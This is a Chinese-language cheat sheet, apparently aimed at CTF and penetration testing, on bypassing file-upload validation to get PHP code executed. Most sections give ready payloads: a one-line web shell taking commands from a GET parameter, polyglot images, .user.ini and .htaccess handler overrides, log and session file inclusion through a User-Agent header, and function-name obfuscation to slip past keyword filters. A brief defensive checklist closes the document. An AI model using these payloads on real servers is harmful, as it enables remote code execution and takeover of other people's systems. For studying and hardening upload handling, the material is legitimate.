# 不安全文件上传绕过秘笈

## 扩展名黑名单绕过

### 双扩展名
```
黑名单: .php

上传: shell.php.jpg
服务器: 验证通过（以.jpg结尾）
Apache配置: AddType application/x-httpd-php .php
结果: shell.php.jpg被当作PHP执行
```

### 空字节截断
```
PHP < 5.3.4

黑名单: .php

上传: shell.php%00.jpg
服务器端:
$filename = $_FILES['file']['name'];  // shell.php%00.jpg
move_uploaded_file($tmp, "./uploads/$filename");
# 实际保存为: shell.php (NULL截断)
```

### 大小写混淆
```
黑名单: .php (小写)

上传: shell.PhP / shell.pHP / shell.PHP
某些服务器不区分大小写，直接执行
```

### 替代扩展名
```
可执行PHP扩展名:
.php3, .php4, .php5, .php7
.phtml, .pht, .phps
.inc (如果Apache配置为执行)
.shtml (如果启用SSI)
```

## MIME类型验证绕过

### 修改Content-Type
```
原始文件：shell.php (application/octet-stream)

修改Content-Type:
Content-Type: image/jpeg
# 或
Content-Type: image/png

服务器仅检查Content-Type而非实际内容类型
```

### 多部分Content-Type
```
Content-Type: multipart/form-data; boundary=----WebKit...
# 某些库处理不当，导致验证失败
```

### 无效但被接受的类型
```
Content-Type: image/jpg; charset=utf-8
Content-Type: image/jpeg;image/png
Content-Type: */*
```

## 文件内容绕过

### 图片头混淆
```
JPEG头: FF D8 FF E0
PNG头: 89 50 4E 47

构造混合文件:
[PNG/JPEG有效头] + [PHP代码]

在hex编辑器中：
89 50 4E 47 ... [PNG数据] ... <?php system($_GET['cmd']); ?>

某些图片库只验证头部
```

### Polyglot文件
```
同时为有效的图片和PHP：
<?php $img = imagecreatefromjpeg($_FILES['file']['tmp_name']); ?>
[实际JPEG二进制数据]

或使用特殊的JPEG标记：
标记Comment中可包含PHP代码
某些配置会执行该标记内容
```

## 文件存储位置绕过

### 路径遍历上传
```
原始上传: /uploads/shell.jpg

攻击：上传 ../shell.php
结果: /shell.php (web root直接运行)

或: ../../var/www/html/shell.php
```

### 目录遍历+扩展名
```
上传路径中混入遍历：
/uploads/../../shell.php

某些框架规范化后变为：
/shell.php
```

## 存储位置配置漏洞

### 可执行目录
```
上传目录配置为可执行：
<Directory "/var/www/uploads">
    AddType application/x-httpd-php .jpg
</Directory>

任何.jpg文件包含PHP都会执行
```

### Web Accessible临时目录
```
上传到/tmp但设置可通过web访问
/var/www/tmp/uploaded_files/shell.php

某些系统未限制tmp目录访问
```

## 文件名和后缀处理

### 特殊字符在文件名中
```
Windows特殊名称绕过：
shell.php:: (流名称)
shell.php:jpg (NTFS alternate data stream)

解析后变为：shell.php
```

### UTF-8或其他编码混淆
```
使用特殊编码的扩展名：
shell.php%c0%ae.jpg  (某些解码库可能处理不当)

或双重编码：
shell.php%252ejpg
```

## 验证逻辑漏洞

### 检查太宽松
```
原始验证：
if (strpos($filename, '.jpg') !== false) {
    // 允许上传
}

上传: shell.jpg.php
# 包含.jpg，通过验证，但被当作PHP执行
```

### 仅检查最后一个字符
```
验证最后3个字符：
substr($filename, -3) == 'jpg'

上传: shell.php.jpg (通过验证)
# 某些服务器从右往左执行，先执行.php
```

### 类型检查不完整
```
仅检查图片魔术字节：
if (file_starts_with_magic_bytes($file, 'JPEG/PNG')) {
    save_file($file);
}

但存储位置可执行，导致运行
```

## 文件包含技术（日志文件包含、Session文件包含、.user.ini、.htaccess配置文件绕过）

### .user.ini文件包含
```php
// .user.ini文件配置auto_prepend_file，间接执行代码
// 创建.user.ini文件：
auto_prepend_file=shell.jpg

// 然后上传包含PHP代码的shell.jpg文件
// 当访问同目录下的PHP文件时，会自动包含shell.jpg并执行代码

// 利用步骤：
// 1. 上传.user.ini文件（auto_prepend_file=shell.jpg）
// 2. 上传包含PHP代码的shell.jpg文件
// 3. 访问同目录下的任意PHP文件，代码自动执行
```

### 日志文件包含
```php
// 当直接上传代码被严格过滤时，可以通过包含日志文件间接执行代码
// 通过UA头、Referer等HTTP头将后门代码写入日志文件，然后包含日志文件

// 利用方法：
// 1. 上传包含日志文件路径的图片马：<? include "/var/lo"."g/nginx/access.lo"."g"?>
//    （使用字符串拼接绕过'log'和'.'的检测）
// 2. 通过.user.ini使PHP文件包含该图片马
// 3. 构造UA头将后门代码写入日志：User-Agent: <?php system($_GET['cmd']);?>
// 4. 访问包含日志的页面，日志中的后门代码会被执行

// 快速定位技巧：
// - 检查代码是否过滤了'log'关键字，如果过滤了，考虑日志包含绕过
// - 检查服务器类型（Nginx/Apache），确定日志文件路径
// - 检查是否过滤了'.'字符，如果过滤了，使用字符串拼接绕过
```

### Session文件包含
```php
// 当直接上传代码被严格过滤（如过滤了'.'字符）时，可以通过包含session文件间接执行代码
// 利用PHP的PHP_SESSION_UPLOAD_PROGRESS机制创建session文件，然后通过.user.ini包含session文件

// 利用步骤：
// 1. 上传.user.ini文件（auto_prepend_file=/tmp/sess_{PHPSESSID}）
// 2. 通过POST上传文件，在PHP_SESSION_UPLOAD_PROGRESS字段中写入PHP代码
// 3. 使用固定的PHPSESSID Cookie值
// 4. 访问包含session的页面，代码自动执行
```

### .htaccess配置绕过
```php
// Apache配置文件绕过
// 方法1：AddType application/x-httpd-php .jpg
AddType application/x-httpd-php .jpg

// 方法2：SetHandler application/x-httpd-php
<FilesMatch "shell.jpg">
    SetHandler application/x-httpd-php
</FilesMatch>

// 上传.htaccess文件后，所有.jpg文件都会被当作PHP执行
```

## 高级代码执行绕过技术

### array_pop($_POST)绕过详解
```php
// 使用短标签<?=绕过'php'检测
// 使用array_pop($_POST)替代$_POST['key']

// 示例代码：
<?=array_pop($_POST)?>
// 等价于：<?php echo array_pop($_POST);?>

// 绕过原理：
// 1. 短标签<?=不包含'php'字符串，可以绕过某些过滤
// 2. array_pop($_POST)可以获取POST数组的最后一个值，无需知道键名
```

### 字符串拼接绕过
```php
// 当过滤了特定关键字时，可以通过字符串拼接绕过
$cmd = 's'.'y'.'s'.'t'.'e'.'m';
$cmd('cat flag.php');

// 或使用数组拼接
$cmd = implode('', ['s', 'y', 's', 't', 'e', 'm']);
$cmd('cat flag.php');
```

### 反引号执行
```php
// 当过滤了system、exec等函数时，可以使用反引号执行系统命令
$output = `cat flag.php`;
echo $output;

// 反引号等价于shell_exec()函数
```

### 字符串函数绕过
```php
// 使用explode、substr、strrev等函数拼接被过滤的关键字
$arr = explode(' ', 'system cat flag');
$cmd = $arr[0];
$cmd($arr[1] . ' ' . $arr[2]);

// 或使用strrev反转字符串
$cmd = strrev('metsys');
$cmd('cat flag.php');
```

## 图片二次渲染绕过

### 完整的二次渲染验证方法
```php
// 使用脚本验证、验证渲染前后差异、验证绕过成功率
// 二次渲染：服务器对上传的图片进行重新渲染（如调整大小、格式转换等）

// 验证步骤：
// 1. 上传测试图片
// 2. 下载服务器渲染后的图片
// 3. 对比原始图片和渲染后图片的差异
// 4. 找出未变化的数据位置
// 5. 在未变化位置插入PHP代码
```

### PNG二次渲染识别
```php
// PNG二次渲染函数：imagecreatefrompng()和imagecopyresampled()
// 找出未变化的数据位置：
// - PNG文件头（89 50 4E 47）通常不变
// - 某些PNG块（chunk）在渲染后可能保持不变
// - 在IDAT块中插入PHP代码可能绕过检查

// 利用方法：
// 1. 创建包含PHP代码的PNG文件
// 2. 在IDAT块中插入代码
// 3. 上传后，服务器渲染可能不会修改IDAT块中的代码
```

### JPG二次渲染识别
```php
// JPG二次渲染函数：imagecreatefromjpeg()和imagecopyresampled()
// 成功率较低但仍有绕过可能
// JPG是压缩格式，重新渲染通常会改变文件内容
// 但在某些特殊情况下，可能找到未变化的位置
```

### 快速定位技巧
```php
// 搜索代码中的二次渲染函数：
// - imagecreatefrompng()
// - imagecreatefromjpeg()
// - imagecopyresampled()
// - imagecopyresized()

// 检查是否进行了像素级重建
// 如果只是简单的格式转换，可能不会完全重建图片内容
```

## 快速定位和利用

**关键词识别**：
- 对上传文件的验证不完整
- 允许多个扩展名
- 仅检查Content-Type
- 存储位置在web可访问目录
- 无文件内容验证（仅检查头部）
- 存在.user.ini或.htaccess配置
- 存在日志文件包含或Session文件包含场景

**测试优先级**：
1. 直接上传PHP文件（检查允许的扩展名）
2. 双扩展名和替代扩展名
3. 修改Content-Type
4. 空字符截断（PHP < 5.3.4）
5. 图片头混淆（Polyglot）
6. 路径遍历
7. .user.ini文件包含
8. 日志文件包含
9. Session文件包含
10. 图片二次渲染绕过

## 防御检查清单

- ✓ 白名单允许的扩展名（不使用黑名单）
- ✓ 验证MIME类型（Magic bytes）
- ✓ 重命名文件（移除原始扩展名）
- ✓ 存储在非web可访问目录
- ✓ 禁止上传目录的脚本执行
- ✓ 验证文件内容，不仅是扩展名
- ✓ 限制文件大小
- ✓ 使用专业库进行图片验证
- ✓ 定期审查上传目录权限
